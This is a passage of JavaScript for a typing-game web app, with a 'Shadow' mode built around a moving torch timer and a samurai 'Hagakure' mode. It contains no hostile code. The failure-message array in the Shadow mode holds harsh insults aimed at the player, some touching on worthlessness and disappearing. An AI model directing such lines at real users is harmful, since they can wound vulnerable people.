            const isHard = Math.random() < 0.25; // 25% hard words sprinkle
            const pool = isHard ? shadowWordsHard : shadowWordsMedium;
            state.words.push(pool[Math.floor(Math.random() * pool.length)]);
        }

        renderShadowWords();

        // Focus Input
        const input = document.getElementById('s-input');
        input.value = '';
        input.focus();
        input.onblur = () => input.focus();

        // Input Listener
        input.oninput = (e) => {
            if (!state.isActive) return;
            const val = e.target.value;

            // Start Torch on first input
            if (!state.startTime && val.length > 0) {
                state.startTime = Date.now();
                startTorchTimer();
            }

            handleShadowInput(val);
            e.target.value = '';
        };

        updateTorchVisuals();
    }

    function startShadowStatsUpdater() {
        if (state.shadowStatsInterval) clearInterval(state.shadowStatsInterval);
        state.shadowStatsInterval = setInterval(updateShadowHUD, 200);
    }

    function updateShadowHUD() {
        if (!state.isActive) return;

        // SANITY (Progress %)
        const sanityEl = document.getElementById('s-hud-sanity');
        if (sanityEl) {
            const total = state.words.length;
            const current = state.currWordIndex;
            const percent = Math.floor((current / total) * 100);
            sanityEl.innerText = percent + '%';
        }

        // WPM
        const wpmEl = document.getElementById('s-hud-wpm');
        if (wpmEl) {
            if (!state.startTime) {
                wpmEl.innerText = '0';
            } else {
                const timeInMinutes = (Date.now() - state.startTime) / 60000;
                const wpm = Math.round((state.correctChars / 5) / timeInMinutes) || 0;
                wpmEl.innerText = wpm;
            }
        }
    }

    let torchIntervalID = null;

    function startTorchTimer() {
        if (torchIntervalID) clearInterval(torchIntervalID);

        const speed = state.shadowBloomDuration;

        torchIntervalID = setInterval(() => {
            if (!state.isActive) {
                clearInterval(torchIntervalID);
                return;
            }
            moveTorchForward();
        }, speed);
    }

    function moveTorchForward() {
        // The Torch moves blindly. It does not care about the user.
        // It shines light. If you are behind, you are in darkness.

        // Advance Torch
        state.torchWordIndex++;

        if (state.torchWordIndex >= state.words.length) {
            console.log("Torch Reached End - Darkness Consumes All");
            clearInterval(torchIntervalID);
            // Torch goes out. User must finish in pitch black if they are behind.
        }

        updateTorchVisuals();
    }

    function updateTorchVisuals() {
        // Clear all lit
        document.querySelectorAll('.s-word.torch-lit').forEach(el => el.classList.remove('torch-lit'));

        // Light up Torch Position
        const wordEls = document.querySelectorAll('.s-word');
        const tWord = wordEls[state.torchWordIndex];

        if (tWord) {
            tWord.classList.add('torch-lit');
            tWord.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'center' });
        }
    }

    function renderShadowWords() {
        const container = document.getElementById('s-words-container');
        container.innerHTML = '';
        state.words.forEach((word) => {
            const wordEl = document.createElement('div');
            wordEl.className = 's-word'; // No 'active' class used now, only torch
            word.split('').forEach(char => {
                const charSpan = document.createElement('span');
                charSpan.innerText = char;
                wordEl.appendChild(charSpan);
            });
            container.appendChild(wordEl);
        });
    }

    function handleShadowInput(char) {
        if (!state.isActive) return;

        const currentWord = state.words[state.currWordIndex];

        // CASE 1: Word Completed, Waiting for Space
        if (state.currCharIndex === currentWord.length) {
            if (char === ' ') {
                // Space typed -> Advance to next word
                state.currWordIndex++;
                state.currCharIndex = 0;
                return;
            } else {
                // User typed a letter instead of space -> Mistake
                handleShadowFail("MISTAKE (EXPECTED SPACE)");
                return;
            }
        }

        // CASE 2: Typing Characters
        const targetChar = currentWord[state.currCharIndex];

        if (char === targetChar) {
            state.currCharIndex++;
            state.correctChars++;

            // Visual: Mark Correct
            const wordEls = document.querySelectorAll('.s-word');
            const currEl = wordEls[state.currWordIndex];
            const charSpan = currEl.querySelectorAll('span')[state.currCharIndex - 1];
            charSpan.classList.add('correct');

            // Update Sanity (Streak)
            state.shadowStreak++;
            updateShadowHUD();

            // --- JUICE: SPLASH PARTICLE ---
            const rect = charSpan.getBoundingClientRect();
            spawnShadowSlash(rect.left + rect.width / 2, rect.top + rect.height / 2);

            // Check if Word is now Finished
            if (state.currCharIndex === currentWord.length) {
                // If it's the LAST word, we win immediately (no space needed)
                if (state.currWordIndex === state.words.length - 1) {
                    // VICTORY
                    handleShadowVictory();
                } else {
                    // Visual cue that we are waiting for space
                    currEl.classList.add('correct');
                }
            }
        } else {
            // --- JUICE: GLITCH EFFECT ---
            triggerShadowGlitch();
            state.shadowStreak = 0; // Sanity Lost
            updateShadowHUD();
            handleShadowFail("MISTAKE");
        }
    }

    const shadowFailureQuotes = [
        "Quit now. You’re just wasting the electricity.",
        "The world doesn't need another quitter. Close the tab.",
        "Your mediocrity is the only thing shining here.",
        "The light didn't fail you. You failed the light.",
        "Some people are meant to lead; you were clearly meant to trip.",
        "Give up. The shadows are the only place you'll ever fit in.",
        "Imagine failing at something this simple. Now imagine the rest of your life.",
        "Do you always quit when things get difficult, or is today special?",
        "Your parents expect more than a failure who can't even type in the dark.",
        "The void sees you for what you truly are: a disappointment.",
        "You can restart the test, but you can't restart your lack of talent.",
        "The light is gone. Just like every opportunity you've ever had.",
        "Stop trying. The silence is better than your clumsy attempts.",
        "You’re not 'out of practice.' You are simply out of potential.",
        "Go ahead and cry. The shadows have heard better sobs than yours.",
        "If you disappeared right now, the dark wouldn't even notice the difference.",
        "You’re a waste of atoms.",
        "Stop. You’re embarrassing the human race.",
        "The mirror hates you most.",
        "Every time they look at you, they see their own wasted years.",
        "Typing like a toddler in the dark. Pathetic.",
        "The keyboard isn't the problem. The person touching it is.",
        "The letters haven't moved since 1873. What's your excuse?"
    ];

    const shadowVictoryQuotes = [
        "The void gazes back, and blinks.", "You have become the absence of light.", "Perfect stillness in motion.",
        "The blade and the spirit are one.", "Darkness is your ally.", "You walk where others fear to tread.",
        "Silence is the loudest sound.", "A master of the unseen arts.", "The shadows whisper your name.",
        "Reality bends to your will.", "No footprint, no sound, no mercy.", "You are the storm that makes no noise.",
        "The night embraces its own.", "Beyond the edge of the blade.", "Your focus cuts through time.",
        "Eternity in a single stroke.", "The abyss finds no flaw in you.", "Pure intent, pure execution.",
        "You have ascended beyond the light.", "The ritual is complete.", "Shadows do not bleed.",
        "The world is an illusion; you are real.", "Faster than the falling dark.", "You are the ghost in the machine.",
        "Nothing remains but your victory.", "The perfect cut leaves no seam.", "You strike from everywhere at once.",
        "Blindness is no obstacle to true sight.", "The void accepts your offering.", "Legend requires no witness."
    ];

    function handleShadowFail(reason) {
        state.isActive = false;
        if (torchIntervalID) clearInterval(torchIntervalID);
        if (state.shadowStatsInterval) clearInterval(state.shadowStatsInterval);

        // Show Overlay
        const overlay = document.getElementById('s-result-overlay');
        overlay.classList.remove('hidden');
        overlay.classList.remove('victory');
        overlay.classList.add('failure');

        const title = document.getElementById('s-result-title');
        const rText = document.getElementById('s-result-reason');

        title.innerText = "CONSUMED";

        // Flavor Text Logic
        const randomQuote = shadowFailureQuotes[Math.floor(Math.random() * shadowFailureQuotes.length)];
        rText.innerText = randomQuote;

        // --- VISUALS ---
        title.classList.remove('failure-title-enter');
        void title.offsetWidth;
        title.classList.add('failure-title-enter');

        spawnResultParticles(30);
        triggerVoidEruption();
    }

    function handleShadowVictory() {
        state.isActive = false;
        if (torchIntervalID) clearInterval(torchIntervalID);
        if (state.shadowStatsInterval) clearInterval(state.shadowStatsInterval);

        const overlay = document.getElementById('s-result-overlay');
        overlay.classList.remove('hidden');
        overlay.classList.remove('failure');
        overlay.classList.add('victory');

        const title = document.getElementById('s-result-title');
        const rText = document.getElementById('s-result-reason');

        title.innerText = "ASCENDED";

        const randomQuote = shadowVictoryQuotes[Math.floor(Math.random() * shadowVictoryQuotes.length)];
        rText.innerText = randomQuote;

        playSound('gong');
        playSound('sheath');

        // --- VISUALS ---
        title.classList.remove('victory-title-enter');
        void title.offsetWidth;
        title.classList.add('victory-title-enter');

        spawnResultParticles(60);
        triggerVoidEruption();
    }

    // --- SHADOW JUICE FUNCTIONS ---
    function spawnShadowSlash(x, y) {
        // Create a fast, sharp "cut" line
        const el = document.createElement('div');
        el.className = 's-slash-particle';
        document.body.appendChild(el);

        // Random stylized slash properties
        const angle = Math.random() * 360 + 'deg';
        const length = 40 + Math.random() * 60 + 'px';
        const width = 2 + Math.random() * 2 + 'px';

        el.style.left = x + 'px';
        el.style.top = y + 'px';
        el.style.width = width;
        el.style.height = length;
        el.style.setProperty('--angle', angle);
        el.style.setProperty('--tx', (Math.random() - 0.5) * 50 + 'px');
        el.style.setProperty('--ty', (Math.random() - 0.5) * 50 + 'px');

        // Animate
        el.style.animation = 'slashAnim 0.3s ease-out forwards';

        setTimeout(() => el.remove(), 300);
    }

    function triggerShadowGlitch() {
        if (!state.isActive) return;
        const ui = document.getElementById('shadow-ui');
        ui.classList.add('shadow-glitch-active');

        // Intense screen shake
        document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;

        setTimeout(() => {
            ui.classList.remove('shadow-glitch-active');
            document.body.style.transform = 'none';
        }, 200);
    }

    function spawnResultParticles(count) {
        const overlay = document.getElementById('s-result-overlay');

        for (let i = 0; i < count; i++) {
            const el = document.createElement('div');
            el.className = 's-result-particle';

            // Random physics
            const angle = Math.random() * Math.PI * 2;
            const velocity = 100 + Math.random() * 200;
            const tx = Math.cos(angle) * (velocity + Math.random() * 100) + 'px';
            const ty = Math.sin(angle) * (velocity + Math.random() * 100) + 'px';

            // Random size
            const size = 4 + Math.random() * 6 + 'px';
            el.style.width = size;
            el.style.height = size;

            // Set styles relative to center (50% 50% in CSS)
            el.style.left = '50%';
            el.style.top = '50%';
            el.style.setProperty('--tx', tx);
            el.style.setProperty('--ty', ty);

            // Random delay
            el.style.animation = `particleFly ${0.8 + Math.random() * 0.5}s cubic-bezier(0.1, 0.9, 0.2, 1) forwards`;

            overlay.appendChild(el);

            // Cleanup
            setTimeout(() => el.remove(), 1500);
        }
    }

    function triggerVoidEruption() {
        const ui = document.getElementById('shadow-ui');
        ui.classList.remove('void-eruption');
        void ui.offsetWidth;
        ui.classList.add('void-eruption');
    }



    function exitShadowMode() {
        state.isActive = false;
        if (torchIntervalID) {
            clearInterval(torchIntervalID);
            torchIntervalID = null;
        }

        // Cleanup Visuals
        const ui = document.getElementById('shadow-ui');
        ui.classList.remove('void-eruption');

        const title = document.getElementById('s-result-title');
        if (title) title.classList.remove('victory-title-enter');

        // Stop Shadow music and restore previous audio
        shadowAudio.pause();
        shadowAudio.currentTime = 0;
        if (wasPlayingBeforeShadow.masterPlaying) {
            masterAudio.play().catch(e => console.log('Resume master failed:', e));
        }
        if (wasPlayingBeforeShadow.bgAudioPlaying && currentBgAudio) {
            currentBgAudio.play().catch(e => console.log('Resume bg failed:', e));
        }
        // Restore wallpaper video audio
        if (UI.bgVideo) UI.bgVideo.muted = wasPlayingBeforeShadow.bgVideoMuted ?? true;

        // Hide Shadow UI completely
        document.getElementById('shadow-ui').classList.add('hidden');

        // Close track panel
        const sTPanel = document.getElementById('s-track-panel');
        if (sTPanel) sTPanel.classList.add('hidden');

        // Reset internal Shadow states
        document.getElementById('s-game-board').classList.add('hidden');
        document.getElementById('s-result-overlay').classList.add('hidden');
        document.getElementById('s-setup').classList.remove('hidden'); // Reset for next time

        // Restore Main UI Elements
        // We explicitly unhide everything that startShadowMode hid to ensure full restoration
        const elementsToRestore = ['landing-page', 'game-ui', 'test-config', 'words-container'];
        elementsToRestore.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.classList.remove('hidden');
        });

        // Ensure Results Screen and Modal are closed/hidden to start fresh
        const elementsToKeepHidden = ['results-screen', 'modes-modal'];
        elementsToKeepHidden.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.classList.add('hidden');
        });

        // Trigger a refresh of the words if possible, or just focus input
        const mainInput = document.getElementById('words-input');
        if (mainInput) mainInput.focus();
    }

    function startHagakureMode() {
        const hagakureQuotes = [
            "THE WAY OF THE WARRIOR",
            "HESITATION IS DEFEAT",
            "ONE STRIKE. ONE KILL.",
            "SILENCE THE MIND",
            "FOCUS ABSOLUTE",
            "DEATH BEFORE DISHONOR",
            "STEEL YOUR SOUL",
            "EMBRACE THE VOID",
            "NO SECOND CHANCES",
            "PERFECTION OR NOTHING",
            "THE BLADE NEVER LIES",
            "BREATHE. STRIKE. WIN.",
            "FEAR IS THE MIND-KILLER",
            "VICTORY IN STILLNESS",
            "UNLEASH YOUR DEMON",
            "A WARRIOR STANDS ALONE",
            "SHARPEN YOUR SPIRIT",
            "TOTAL CONCENTRATION",
            "HONOR THE CODE",
            "BECOME THE BLADE",
            "MIND LIKE WATER",
            "STRIKE TRUE",
            "NO FEAR. NO MERCY.",
            "THE PATH IS LONE",
            "DISCIPLINE IS FREEDOM",
            "CONQUER YOURSELF",
            "FLASH OF STEEL",
            "SILENT VICTORY",
            "ENDURE AND PREVAIL",
            "THE SWORD IS THE SOUL"
        ];

        const randomQuote = hagakureQuotes[Math.floor(Math.random() * hagakureQuotes.length)];
        const splashTitle = document.querySelector('.hagakure-title');
        if (splashTitle) splashTitle.innerText = randomQuote;

        // 1. Show Splash
        const splash = document.getElementById('hagakure-splash');
        splash.classList.remove('hidden');

        // 2. Pause all existing audio and play Hagakure theme
        // Save current audio state for restoration on exit
        wasPlayingBeforeHagakure.trackIndex = currentTrackIndex;
        wasPlayingBeforeHagakure.masterPlaying = !masterAudio.paused;
        wasPlayingBeforeHagakure.bgAudioPlaying = currentBgAudio && !currentBgAudio.paused;
        wasPlayingBeforeHagakure.bgVideoMuted = UI.bgVideo ? UI.bgVideo.muted : true;

        // Pause master audio
        if (!masterAudio.paused) masterAudio.pause();

        // Pause wallpaper bg audio
        if (currentBgAudio && !currentBgAudio.paused) currentBgAudio.pause();
        // Mute wallpaper video audio (e.g. Gura Yuri has built-in audio)
        if (UI.bgVideo) UI.bgVideo.muted = true;

        // Play Hagakure theme music (default track or last selected)
        playHagakureTrack(currentHagakureTrack);

        // 3. Wait 2 seconds, then transition
        setTimeout(() => {
            splash.classList.add('hidden');

            // Hide standard UI
            const gameUI = document.getElementById('game-ui');
            const appHeader = document.getElementById('app-header');
            const navButtons = document.getElementById('top-nav-buttons');
            const footer = document.querySelector('footer') || document.querySelector('.site-footer');

            if (gameUI) gameUI.classList.add('hidden');
            if (appHeader) appHeader.style.display = 'none';
            if (navButtons) navButtons.style.display = 'none';
            if (footer) footer.style.display = 'none';

            // Show Hagakure UI
            const hUI = document.getElementById('hagakure-ui');
            hUI.classList.remove('hidden');

            // Init hagakure track selector UI
            initHagakureTrackSelector();

            // Set Game State
            state.gameMode = 'hagakure';

            // Global Shortcuts for Hagakure (Tab to Retry)
            if (!window.hTabListener) {
                window.hTabListener = (e) => {
                    if (state.gameMode === 'hagakure' && e.key === 'Tab') {
                        e.preventDefault();
                        // If we are in setup screen, do nothing or restart setup? 
                        // If we are in game, restart game with current settings
                        const setupInfo = document.getElementById('h-setup');
                        if (setupInfo && !setupInfo.classList.contains('hidden')) {
                            // Do nothing in setup
                        } else {
                            initHagakureGame(); // Restart with current settings
                        }
                    }
                };
                document.addEventListener('keydown', window.hTabListener);
            }

            initHagakureSetup();
        }, 2000);
    }

    function initHagakureSetup() {
        // Show Setup, Hide Board
        const setup = document.getElementById('h-setup');
        const board = document.getElementById('h-game-board');
        if (setup) setup.classList.remove('hidden');
        if (board) board.classList.add('hidden');

        // Exit Button Listener
        const exitBtn = document.getElementById('h-exit-path-btn');
        if (exitBtn) {
            exitBtn.onclick = exitHagakureMode;
        }

        // Reset any previous listeners to avoid duplicates (smarter way is to do once, but this is safe)
        const opts = document.querySelectorAll('.h-opt-btn');
        opts.forEach(btn => {
            btn.onclick = () => {
                const mode = btn.dataset.mode;
                let wordCount = 50; // Default Original

                if (mode === '1') wordCount = 10;
                if (mode === '3') wordCount = 25; // Adjusted to ~3 visual lines
                if (mode === '5') wordCount = 40; // Adjusted to ~5 visual lines
                if (mode === 'original') wordCount = 60; // Epic length

                // Save config for restart
                state.hagakureMode = mode;
                state.hagakureWordCount = wordCount;

                initHagakureGame();
            };
        });
    }

    function exitHagakureMode() {
        const hUI = document.getElementById('hagakure-ui');
        if (hUI) hUI.classList.add('hidden');

        // Close track panel if open
        const trackPanel = document.getElementById('h-track-panel');
        if (trackPanel) trackPanel.classList.add('hidden');

        // Show Standard UI
        const gameUI = document.getElementById('game-ui');
        const appHeader = document.getElementById('app-header');
        const navButtons = document.getElementById('top-nav-buttons');
        const footer = document.querySelector('footer') || document.querySelector('.site-footer');

        if (gameUI) gameUI.classList.remove('hidden');
        if (appHeader) appHeader.style.display = ''; // Reset to default CSS
        if (navButtons) navButtons.style.display = ''; // Reset to default CSS
        if (footer) footer.style.display = ''; // Reset to default CSS

        state.gameMode = 'time'; // Default back to time or previous

        // Stop Hagakure theme music
        hagakureAudio.pause();
        hagakureAudio.currentTime = 0;

        // Resume previous audio state
        if (wasPlayingBeforeHagakure.masterPlaying) {
            masterAudio.play().catch(e => console.log('Resume master audio failed:', e));
        }
        if (wasPlayingBeforeHagakure.bgAudioPlaying && currentBgAudio) {
            currentBgAudio.play().catch(e => console.log('Resume bg audio failed:', e));
        }
        // Restore wallpaper video audio
        if (UI.bgVideo) UI.bgVideo.muted = wasPlayingBeforeHagakure.bgVideoMuted ?? true;

        // Clear Hagakure specific state
        if (state.timerInterval) clearInterval(state.timerInterval);

        // Re-init standard game
        newGame();
    }

    function initHagakureGame() {
        // Hide Setup, Show Board
        const setup = document.getElementById('h-setup');
        const board = document.getElementById('h-game-board');
        if (setup) setup.classList.add('hidden');
        if (board) board.classList.remove('hidden');
        const overlay = document.getElementById('hand-guide-overlay');
        if (overlay) {
            overlay.classList.remove('glow-low', 'glow-med', 'glow-high');
            if (dojoState.streak > 50) overlay.classList.add('glow-high');
            else if (dojoState.streak > 25) overlay.classList.add('glow-med');
            else if (dojoState.streak > 10) overlay.classList.add('glow-low');
        }

        // Show Header
        const hHeader = document.querySelector('.h-header');
        if (hHeader) hHeader.style.display = 'flex';

        // CLEANUP EFFECTS
        const hUI = document.getElementById('hagakure-ui');
        if (hUI) hUI.classList.remove('shake-screen');
        const flash = document.querySelector('.red-flash-overlay');
        if (flash) flash.remove();
        const goldFlash = document.querySelector('.gold-flash-overlay');
        if (goldFlash) goldFlash.remove();

        // Cleanup Victory Particles
        if (victoryAnimId) cancelAnimationFrame(victoryAnimId);
        const vParticles = document.getElementById('victory-particles');
        if (vParticles) vParticles.remove();

        const hInput = document.getElementById('h-input');
        if (hInput) {
            hInput.disabled = false;
        }
        const hContainer = document.getElementById('h-words-container');
        const hWpm = document.getElementById('h-wpm');
        const hStreak = document.getElementById('h-streak');

        // Clear any existing timer
        if (state.timerInterval) clearInterval(state.timerInterval);

        // Reset State
        state.words = [];
        const count = state.hagakureWordCount || 50;
        for (let i = 0; i < count; i++) {
            state.words.push(hagakureWords[Math.floor(Math.random() * hagakureWords.length)]);
        }
        state.currWordIndex = 0;
        state.correctChars = 0;
        state.totalCharsTyped = 0;
        state.startTime = null;
        state.isActive = false;
        state.streak = 0;
        if (hStreak) hStreak.innerText = '0';
        if (hWpm) hWpm.innerText = '0'; // Fix: Reset UI WPM

        // Render Words (Character Level)
        hContainer.innerHTML = '';
        state.words.forEach((word, wordIdx) => {
            const wordSpan = document.createElement('div');
            wordSpan.className = 'h-word';

            // Create letters
            word.split('').forEach(char => {
                const charSpan = document.createElement('span');
                charSpan.innerText = char;
                charSpan.className = 'h-letter';
                wordSpan.appendChild(charSpan);
            });

            hContainer.appendChild(wordSpan);
        });

        // Mark first word/letter active
        updateHagakureVisuals();

        // Focus Input force
        hInput.value = '';
        hInput.focus();
        hInput.click();

        // Auto-focus listener
        document.addEventListener('click', (e) => {
            // Only refocus if we are actually in Hagakure mode and clicked HUI
            if (state.gameMode === 'hagakure' && e.target.closest('#hagakure-ui')) {
                hInput.focus();
            }
        });

        // Input Handling
        hInput.oninput = (e) => {
            const value = hInput.value;
            const currWord = state.words[state.currWordIndex];

            // Start Timer
            if (!state.isActive && value.length === 1) {
                state.isActive = true;
                state.startTime = Date.now();
                startHagakureTimer();
            }

            // CHECK INPUT (Character by Character)

            // 1a. Check for Last Word Completion (No Space Needed)
            if (state.currWordIndex === state.words.length - 1 && value === currWord) {
                // Particles for last character
                const hWordsContainer = document.getElementById('h-words-container');
                const lastWordEl = hWordsContainer.children[state.currWordIndex];
                if (lastWordEl && lastWordEl.children.length > 0) {
                    const lastLetterEl = lastWordEl.children[lastWordEl.children.length - 1];
                    const rect = lastLetterEl.getBoundingClientRect();
                    spawnHagakureParticles(rect.left + rect.width / 2, rect.top + rect.height / 2);
                }

                state.correctChars += currWord.length;
                state.currWordIndex++;
                state.streak++;
                hInput.value = '';
                showHagakureVictory();
                return;
            }

            // 1b. Space -> Next Word (only if word is complete)
            if (value.endsWith(' ')) {
                if (value.trim() === currWord) {
                    // Update correct chars for the completed word + space
                    state.correctChars += currWord.length + 1;

                    state.currWordIndex++;
                    state.streak++;
                    const hStreak = document.getElementById('h-streak');
                    if (hStreak) hStreak.innerText = state.streak;
                    hInput.value = '';

                    if (state.currWordIndex >= state.words.length) {
                        showHagakureVictory(); // Win
                    } else {
                        updateHagakureVisuals();
                    }
                } else {
                    // Space pressed but word incomplete/wrong -> Game Over
                    gameOverHagakure();
                }
                return;
            }

            // 2. Check for Mistake (Standard typing)
            if (!currWord.startsWith(value)) {
                gameOverHagakure();
                return;
            }

            // Particles for character just typed
            if (value.length > 0) {
                const hWordsContainer = document.getElementById('h-words-container');
                const activeWordEl = hWordsContainer.children[state.currWordIndex];
                if (activeWordEl) {
                    const letterIndex = value.length - 1;
                    const letterEl = activeWordEl.children[letterIndex];
                    if (letterEl) {
                        const rect = letterEl.getBoundingClientRect();
                        spawnHagakureParticles(rect.left + rect.width / 2, rect.top + rect.height / 2);
                    }
                }
            }

            // 3. Update Visuals (Highlight typed letters)
            updateHagakureVisuals(value.length);
        };
    }

    function updateHagakureVisuals(typedLength = 0) {
        const hContainer = document.getElementById('h-words-container');
        const words = hContainer.children;

        // 1. Reset all words
        Array.from(words).forEach((w, i) => {
            w.classList.remove('active', 'correct', 'waiting-space');
            if (i < state.currWordIndex) w.classList.add('correct');
        });

        // 2. set Active Word
        if (state.currWordIndex < words.length) {
            const activeWord = words[state.currWordIndex];
            activeWord.classList.add('active');

            // 3. Letter styling (Correct / Cursor)
            const letters = activeWord.children;
            Array.from(letters).forEach((l, i) => {
                l.classList.remove('h-correct', 'h-cursor');
                if (i < typedLength) {
                    l.classList.add('h-correct');
                }
                // Cursor on the NEXT char to be typed
                if (i === typedLength) {
                    l.classList.add('h-cursor');
                }
            });

            // If we typed passed the last char (waiting for space), maybe cursor on last char?
            // Or render an extra "space" cursor. For now simple:
            if (typedLength === letters.length) {
                // Maybe add a subtle cursor at the end via CSS on the word
                activeWord.classList.add('waiting-space');
            } else {
                activeWord.classList.remove('waiting-space');
            }
        }
    }

    function startHagakureTimer() {
        state.timerInterval = setInterval(() => {
            if (!state.isActive) return;
            const elapsed = (Date.now() - state.startTime) / 1000 / 60;

            // Calculate total correct chars (completed words + current input)
            const currentInputLen = document.getElementById('h-input').value.length;
            const totalChars = state.correctChars + currentInputLen;

            const wpm = Math.round((totalChars / 5) / elapsed) || 0;
            const hWpm = document.getElementById('h-wpm');
            if (hWpm) hWpm.innerText = wpm;
        }, 500); // 500ms update
    }

    function showHagakureVictory() {
        state.isActive = false;
        clearInterval(state.timerInterval);

        // Calculate Final WPM
        const elapsed = (Date.now() - state.startTime) / 1000 / 60;
        const wpm = Math.round((state.correctChars / 5) / elapsed) || 0;

        // SAVE STATS (HAGAKURE MODE)
        if (window.updateUserStats) {
            const timeSeconds = (Date.now() - state.startTime) / 1000;
            window.updateUserStats(wpm, timeSeconds, 'hagakure');
        }

        let rank = "RONIN";
        let msg = "Your blade is heavy. Train harder.";
        let color = "#9e9e9e"; // Grey (Ronin - Unmastered)

        if (wpm >= 100) {
            rank = "KENSEI";
            msg = "Sword Saint. You are the storm.";
            color = "#00e5ff"; // Cyan/Diamond (Kensei - Godlike)
        } else if (wpm >= 80) {
            rank = "SHOGUN";
            msg = "A master of the unseen blade.";
            color = "#ffd700"; // Gold (Shogun - Ruler)
        } else if (wpm >= 60) {
            rank = "DAIMYO";
            msg = "You command the flow of battle.";
            color = "#d32f2f"; // Crimson (Daimyo - Warlord) -- Changed from Silver to thematic Warlord Red
        } else if (wpm >= 40) {
            rank = "SAMURAI";
            msg = "Sharp. Precise. Honorable.";
            color = "#ff4444"; // Red (Samurai - Blood)
        }

        const hContainer = document.getElementById('h-words-container');

        // Hide Header
        const hHeader = document.querySelector('.h-header');
        if (hHeader) hHeader.style.display = 'none';

        // Disable input
        const hInput = document.getElementById('h-input');
        if (hInput) {
            hInput.disabled = true;
            hInput.blur();
        }

        // Epic Dynamic Flash
        const flashOverlay = document.createElement('div');
        flashOverlay.className = 'gold-flash-overlay';
        flashOverlay.style.background = color; // Apply Rank Color
        document.body.appendChild(flashOverlay);
        setTimeout(() => flashOverlay.remove(), 2000);

        // Visual Feast (Particles)
        // High ranks = Rising Sparks (Ascension)
        // Low ranks = Falling Petals (Melancholy)
        const particleType = (rank === 'DAIMYO' || rank === 'SHOGUN' || rank === 'KENSEI') ? 'rising' : 'falling';
        runVictoryParticles(color, particleType);

        hContainer.innerHTML = `
            <div class="victory-rise" style="width: 100%; text-align: center; color: ${color}; font-family: Shojumaru; font-size: 4rem; text-shadow: 0 0 20px ${color}80; animation-delay: 0.2s;">VICTORY</div>
            <div class="victory-rise" style="width: 100%; text-align: center; font-size: 2rem; color: #fff; margin-top: 10px; font-weight: bold; letter-spacing: 4px; animation-delay: 0.5s;">${rank}</div>
            <div class="victory-rise" style="width: 100%; text-align: center; font-size: 1.2rem; color: #aaa; margin-top: 20px; font-style: italic; animation-delay: 0.8s;">"${msg}"</div>
            <div class="victory-rise" style="width: 100%; text-align: center; font-size: 1.5rem; color: ${color}; margin-top: 20px; animation-delay: 1.1s;">WPM: ${wpm}</div>
        `;

        // Click to restart
        const restartHandler = () => {
            document.removeEventListener('click', restartHandler);
            initHagakureGame();
        };
        setTimeout(() => document.addEventListener('click', restartHandler), 500);
    }

    function gameOverHagakure() {
        state.isActive = false;
        clearInterval(state.timerInterval);

        const hContainer = document.getElementById('h-words-container');
        const failMsg = hagakureFailMessages[Math.floor(Math.random() * hagakureFailMessages.length)];

        let subMsg = "";

        // Progress Logic (Dynamic)
        const total = state.hagakureWordCount || 50;
        const p = state.currWordIndex / total;

        if (p < 0.1) {
            subMsg = hagakureEarlyFailMessages[Math.floor(Math.random() * hagakureEarlyFailMessages.length)];
        } else if (p >= 0.8) {
            subMsg = hagakureLateFailMessages[Math.floor(Math.random() * hagakureLateFailMessages.length)];
        } else {
            // General/Middle
            const useMiddle = Math.random() > 0.5;
            if (useMiddle) {
                subMsg = hagakureMiddleFailMessages[Math.floor(Math.random() * hagakureMiddleFailMessages.length)];
            } else {
                subMsg = hagakureGeneralFailMessages[Math.floor(Math.random() * hagakureGeneralFailMessages.length)];
            }
        }

        // Disable input to prevent further typing
        const hInput = document.getElementById('h-input');
        if (hInput) {
            hInput.disabled = true;
            hInput.blur();
        }

        // --- EPIC EFFECTS ---
        const hUI = document.getElementById('hagakure-ui');
        hUI.classList.add('shake-screen');

        // Red Flash
        const flashOverlay = document.createElement('div');
        flashOverlay.className = 'red-flash-overlay';
        document.body.appendChild(flashOverlay);
        // Remove flash after anim
        setTimeout(() => flashOverlay.remove(), 600);

        // Render
        hContainer.innerHTML = `
            <div class="text-slam" style="width: 100%; text-align: center; color: #ce1126; font-family: Shojumaru; font-size: 4rem; text-shadow: 0 0 10px rgba(206, 17, 38, 0.5);">${failMsg}</div>
            <div style="width: 100%; text-align: center; font-size: 1.2rem; color: #888; margin-top: 10px; font-style: italic;">${subMsg}</div>
            <div style="width: 100%; text-align: right; font-size: 0.8rem; margin-top: 10px; opacity: 0.6; letter-spacing: 2px; color: #ce1126;">PRESS TAB TO FACE YOUR DESTINY</div>
        `;

        // Click to restart
        const restartHandler = () => {
            document.removeEventListener('click', restartHandler);
            initHagakureGame();
        };
        setTimeout(() => document.addEventListener('click', restartHandler), 500);
    }

    UI.wallpaperGrid.addEventListener('click', (e) => {
        const target = e.target.closest('.wallpaper-thumb');
        if (target) {
            userConfig.wallpaperId = target.dataset.id;
            const wp = wallpapers.find(w => w.id === userConfig.wallpaperId);
            if (wp) {
                // Apply presets if they exist on the wallpaper
                if (wp.effectType) userConfig.effectType = wp.effectType;
                if (wp.effectColor) userConfig.effectColor = wp.effectColor;
                if (wp.effectIntensity) userConfig.effectIntensity = wp.effectIntensity;
                if (wp.tint) userConfig.tint = wp.tint;
                if (wp.opacity) userConfig.opacity = wp.opacity;
                if (wp.soundProfile) userConfig.soundProfile = wp.soundProfile;
                if (wp.particleColor) userConfig.particleColor = wp.particleColor;
                if (wp.caretColor) userConfig.caretColor = wp.caretColor;

                // Refresh effects and UI
                initParticles();

                // Update UI controls to match new config
                UI.opacitySlider.value = userConfig.opacity;
                UI.opacityValue.innerText = userConfig.opacity + '%';

                document.getElementById('intensity-slider').value = userConfig.effectIntensity;
                document.getElementById('intensity-value').innerText = userConfig.effectIntensity + '%';

                document.querySelectorAll('.effect-btn').forEach(btn =>
                    btn.classList.toggle('active', btn.dataset.effect === userConfig.effectType));

                document.querySelectorAll('.color-dot').forEach(dot =>
                    dot.classList.toggle('active', dot.dataset.color === userConfig.effectColor));
                document.getElementById('custom-color-picker').value = userConfig.effectColor;

                document.querySelectorAll('.tint-btn').forEach(btn =>
                    btn.classList.toggle('active', btn.dataset.tint === userConfig.tint));

                document.querySelectorAll('.sound-btn').forEach(btn =>
                    btn.classList.toggle('active', btn.dataset.sound === userConfig.soundProfile));

                // Sync Particle Color UI
                document.querySelectorAll('.color-btn').forEach(btn => {
                    const colorMap = { gold: '#ffd700', cyan: '#00d4ff', magenta: '#ff00ff', white: '#ffffff' };
